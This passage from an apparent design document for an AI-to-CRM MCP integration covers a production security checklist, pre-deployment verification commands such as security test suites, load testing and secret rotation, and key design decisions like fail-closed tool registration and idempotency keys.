  { pattern: /SELECT\s+.*\s+FROM|INSERT\s+INTO|UPDATE\s+.*\s+SET|DELETE\s+FROM/i, reason: 'Raw SQL detected' },
];
```

---

### Security Checklist for Production

| Priority | Action | Status | Effort |
|----------|--------|--------|--------|
| 🔴 P0 | Implement SOQL/SOSL escaping | ✅ | 2 hours |
| 🔴 P0 | Move credentials to AWS Secrets Manager | ✅ | 4 hours |
| 🔴 P0 | Define idempotency key algorithm with TTL | ✅ | 2 hours |
| ⚠️ P1 | Implement Redis-based rate limiting (App layer) | ✅ | 4 hours |
| ⚠️ P1 | Implement CRM-level rate limiting (SF/HubSpot) | ✅ | 2 hours |
| ⚠️ P1 | Add PII redaction to audit logs | ✅ | 3 hours |
| ⚠️ P1 | Integrate Opossum circuit breaker | ✅ | 4 hours |
| ⚠️ P1 | Add explicit REJECTED status handling | ✅ | 1 hour |
| ⚪ P2 | Add request signing for webhooks | ⏳ | 4 hours |
| ⚪ P2 | Implement audit log encryption at rest | ⏳ | 4 hours |
| ⚪ P2 | Add tool execution timeouts | ✅ | 2 hours |
| ⚪ P2 | Implement rollback capability | ✅ | 6 hours |

### Pre-Production Verification

Before deploying to production:

1. **Penetration Testing**
   ```bash
   # Test SOQL injection scenarios
   npm run test:security:soql
   
   # Test XSS patterns
   npm run test:security:xss
   
   # Test prototype pollution
   npm run test:security:prototype
   ```

2. **Load Testing**
   ```bash
   # Verify rate limiting under stress
   artillery quick --count 1000 --num 50 http://localhost:3000/mcp/health
   ```

3. **Compliance Audit**
   - [ ] GDPR: PII redaction working correctly
   - [ ] CCPA: Audit log retention policy configured
   - [ ] SOC2: Evidence of access controls

4. **Credential Rotation Test**
   ```bash
   # Simulate secret rotation without downtime
   aws secretsmanager rotate-secret --secret-id prod/crm/salesforce
   ```

---

## Key Design Decisions

1. **Post-Grounding Only**: MCP only receives AI results that passed grounding validation. REJECTED results are blocked before MCP.

2. **Evidence-Based Updates**: Field updates require corresponding evidence from the AI's grounded output.

3. **Idempotency Everywhere**: Every mutating operation uses idempotency keys to prevent duplicates during retries.

4. **Audit Immutability**: All MCP actions are logged with correlation IDs for full traceability.

5. **Explicit Deny Over Implicit Allow**: Tool registration fails closed - must explicitly approve each tool.

6. **Configurable Action Plans**: The mapping from AI decision → tool sequence is configurable per environment.
